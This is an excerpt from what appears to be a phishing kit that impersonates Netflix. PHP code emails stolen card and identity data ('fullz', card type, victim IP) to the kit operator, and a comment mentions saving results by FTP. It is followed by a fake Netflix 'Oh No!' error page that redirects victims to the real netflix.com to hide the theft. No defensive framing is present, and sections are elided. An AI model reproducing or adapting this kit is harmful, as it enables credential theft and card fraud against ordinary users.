...
//FTP == 1 save result >< == 0 don't save result
		...
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = '♥♥ Netf1ix END SESS10N ♥♥ '.$_SESSION['cardtype'].' ♥♥ '.$PublicIP;$headers = 'From: YoCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
...
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Oh No! - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><meta http-equiv="refresh" content="6,url=https://netflix.com/"/><link type="text/css" rel="stylesheet" href="../oille/nul.css"><link type="text/css" rel="stylesheet" href="../oille/null.css"><link rel="shortcut icon" href="../fnset/favicon.ico">
<style>
...
<header class="vx_modal-header"><h1>Oh No!</h1></header></h1><div class="ui-message-container <?php if(isset($_GET['err'])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>
...
<div class="formbase">
<img src="../fnset/error_alert.png" width="150px" style="margin-top:50px;"/>
<div class="vx_form-group vx_floatingLabel_active">Sorry we couldn't create an account for you right now</div>
<div class="loginSignUpSeparator"><span class="textInSeparator"></span></div>
<a href="https://netflix.com/" class="btn_info" title="" onclick="load()">Try again</a>
</div>
</div>
</form>
</div>
